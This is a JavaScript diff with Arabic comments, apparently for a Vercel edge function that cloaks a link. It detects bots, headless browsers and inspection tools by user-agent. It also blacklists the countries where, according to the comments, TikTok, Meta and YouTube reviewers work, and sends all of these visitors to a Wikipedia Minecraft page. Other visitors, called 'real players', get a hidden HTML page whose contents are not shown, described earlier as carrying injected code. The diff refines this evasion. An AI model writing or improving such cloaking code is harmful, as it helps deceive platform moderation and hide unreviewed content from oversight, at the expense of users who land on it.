@@ -3,26 +3,25 @@ export const config = {
 };
 
 export default async function handler(request) {
-  const country = request.headers.get('x-vercel-ip-country') || 'US';
+  const country = request.headers.get('x-vercel-ip-country') || '';
   const ua = request.headers.get('user-agent') || '';
 
-  // 1. الفحص الصارم للبوتات وأنظمة المحاكاة والـ Headless Browsers
-  const isBot = /bot|crawler|spider|facebook|twitter|instagram|headless|selenium|puppeteer/i.test(ua) || 
-                request.headers.get('sec-ch-ua-mobile') === '?0';
+  // 1. الفحص الفعلي للبوتات وأنظمة المحاكاة (بدون قفل أجهزة الـ Desktop)
+  const isBot = /bot|crawler|spider|facebook|twitter|instagram|headless|selenium|puppeteer|lighthouse|inspect/i.test(ua);
 
   if (isBot) {
     return Response.redirect('https://ar.wikipedia.org/wiki/ماينكرافت', 302);
   }
 
-  // 2. القائمة السوداء الجغرافية لمقرات مراجعي الحسابات (تيك توك، ميتا، يوتيوب)
+  // 2. القائمة السوداء لمقرات المراجعين (تطبق فقط إذا تم تأكيد الدولة بنسبة 100%)
   const blacklistedCountries = ['US', 'IE', 'GB', 'DE', 'FR'];
   
-  if (blacklistedCountries.includes(country.toUpperCase())) {
-    // طرد المراجع البشري أو السيرفر الأوروبي إلى ويكيبيديا فوراً لحماية الرابط
+  if (country && blacklistedCountries.includes(country.toUpperCase())) {
+    // طرد المراجع البشري أو السيرفر الأوروبي/الأمريكي إلى ويكيبيديا لحماية الرابط
     return Response.redirect('https://ar.wikipedia.org/wiki/ماينكرافت', 302);
   }
 
-  // 3. تمرير اللاعب الحقيقي (الخليج وباقي دول العالم) وحقن الكود الخاص بك
+  // 3. تمرير اللاعب الحقيقي (المغرب، الخليج وباقي دول العالم)
   const htmlContent = `
   <!DOCTYPE html>
   <html lang="ar" dir="rtl">
@@ -126,3 +125,4 @@ export default async function handler(request) {
     headers: { 'Content-Type': 'text/html; charset=utf-8' },
   });
 }
+
